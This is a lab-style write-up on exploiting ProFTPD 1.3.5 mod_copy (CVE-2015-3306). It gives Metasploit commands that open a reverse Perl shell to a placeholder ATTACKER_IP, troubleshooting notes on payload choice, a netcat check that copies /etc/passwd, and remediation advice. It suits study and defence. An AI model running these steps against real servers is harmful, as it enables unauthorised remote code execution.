# ProFTPD 1.3.5 - mod_copy Remote Code Execution

## Overview

- **Vulnerability:** ProFTPD mod_copy (CVE-2015-3306)
- **Target:** Linux server running ProFTPD 1.3.5
- **Tools:** Nmap, Metasploit, FTP client

## Reconnaissance

Started with a basic port scan:

```
nmap -sV TARGET_IP
```

Two open ports:

- **Port 21** - FTP (ProFTPD 1.3.5)
- **Port 80** - HTTP (Apache)

Confirmed the FTP version with Metasploit's scanner:

```
use auxiliary/scanner/ftp/ftp_version
set RHOSTS TARGET_IP
run
```

Output: `220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)`

Tried anonymous login but got `530 Login incorrect` - anonymous access is disabled.

## Vulnerability Analysis

ProFTPD 1.3.5 has a module called `mod_copy` that allows copying files on the server using `SITE CPFR` and `SITE CPTO` commands. The problem is that these commands don't require authentication. Anyone can copy files between directories without logging in.

The attack works like this:
1. Use `SITE CPFR` / `SITE CPTO` over FTP to write a malicious PHP file into the web root
2. Trigger the PHP file via HTTP
3. The PHP file executes a reverse shell command
4. Target machine connects back to you

## Exploitation

### Using Metasploit

```
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set LPORT 4444
set SITEPATH /var/www/html
set payload cmd/unix/reverse_perl
exploit
```

Got a shell and read the target file.

### Issues I Ran Into

The first few attempts didn't work. Here's what went wrong and how I fixed it:

**1. Wrong SITEPATH**

The default SITEPATH was set to `/var/www`. The exploit appeared to run fine but no session came back. Changed it to `/var/www/html` and that fixed it.

**2. Payload selection**

First tried `cmd/unix/reverse_python` - no session. Then tried `cmd/unix/reverse_netcat` - also nothing. Finally `cmd/unix/reverse_perl` worked. Turns out the target didn't have Python or netcat installed, but Perl was available.

I also tried `php/meterpreter/reverse_tcp` but this exploit only supports `cmd/unix/*` payloads.

**3. VERBOSE mode helped**

Setting `set VERBOSE true` showed me exactly what was happening. I could see the PHP payload being written to the web directory and triggered over HTTP, which told me the problem was on the reverse connection side (wrong payload), not the exploit itself.

### Manual Testing

You can verify if mod_copy is active by connecting to FTP directly:

```bash
nc TARGET_IP 21
SITE CPFR /etc/passwd
SITE CPTO /tmp/test.txt
```

If you get `350` and `250` responses, mod_copy is active and the target is likely vulnerable.

## Exploit Script

See [exploit.py](./exploit.py) - a Python script that automates the mod_copy file copy process.

```
python3 exploit.py <target_ip> <attacker_ip> <port>
```

## Lessons Learned

- Not every exploit supports every payload. Always check with `show payloads`.
- You might need to try multiple payloads because you don't know which tools are installed on the target (Python, netcat, Perl, etc).
- Path settings like SITEPATH vary between systems. `/var/www` and `/var/www/html` are different and getting this wrong means the exploit silently fails.
- VERBOSE mode is useful for debugging failed exploits.

## Remediation

- Update ProFTPD to the latest version
- Disable mod_copy in proftpd.conf
- Use SFTP instead of FTP
- Restrict write permissions on web directories
